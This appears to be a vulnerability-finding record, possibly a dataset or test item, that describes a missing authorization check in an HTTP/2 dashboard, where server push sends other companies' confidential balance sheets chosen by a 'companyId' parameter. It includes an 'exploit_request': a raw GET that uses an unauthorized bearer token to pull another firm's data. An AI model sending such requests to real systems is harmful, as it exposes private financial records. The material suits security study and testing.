diagnosis: The HTTP/2 dashboard endpoint uses native server-push to preemptively send confidential company balance sheets via stream.pushStream based on url.searchParams.get('companyId'). It performs no authorization check against the client's HTTP/2 session or token, allowing any connecting client to receive private financial statements of other firms.
exploit_request:
GET /dashboard?companyId=comp_acme_investments_991 HTTP/2
Host: analytics.fintech.internal:8443
Authorization: Bearer <unauthorized_firm_token>
Accept: text/html
